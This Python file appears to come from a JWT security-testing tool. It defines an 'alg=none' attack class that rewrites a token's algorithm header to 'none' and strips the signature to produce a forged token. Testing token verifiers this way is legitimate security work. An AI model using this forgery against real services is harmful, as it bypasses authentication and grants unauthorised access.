# -*- coding: utf-8 -*-
from _placeholder import PlaceholderAttack

class AlgorithmNoneAttack(PlaceholderAttack):
    IS_TOKEN_ATTACK = True
    NAME = 'Algorithm Confusion (RS256→none)'
    CATEGORY = 'Algorithm Confusion'
    SEVERITY = 'High'
    DESCRIPTION = 'Change alg to none and remove the JWT signature.'

    def mutate(self, jwt):
        header = self.mutations.clone_header(jwt)
        payload = self.mutations.clone_payload(jwt)
        self.mutations.replace_header(header, 'alg', 'none')
        token = self.mutations.rebuild_token(header, payload, self.mutations.remove_signature())
        return token, header, payload, 'Changed alg to none and removed signature.', 'alg=none'
